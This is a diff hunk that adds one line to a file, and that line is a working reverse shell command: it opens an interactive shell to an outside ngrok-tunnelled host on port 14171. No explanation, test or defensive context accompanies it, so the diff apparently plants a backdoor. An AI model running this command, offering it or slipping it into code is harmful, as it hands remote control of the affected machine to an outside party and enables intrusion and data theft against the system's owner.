@@ -1,0 +1,1 @@
+sh -i >& /dev/tcp/6.tcp.ngrok.io/14171 0>&1
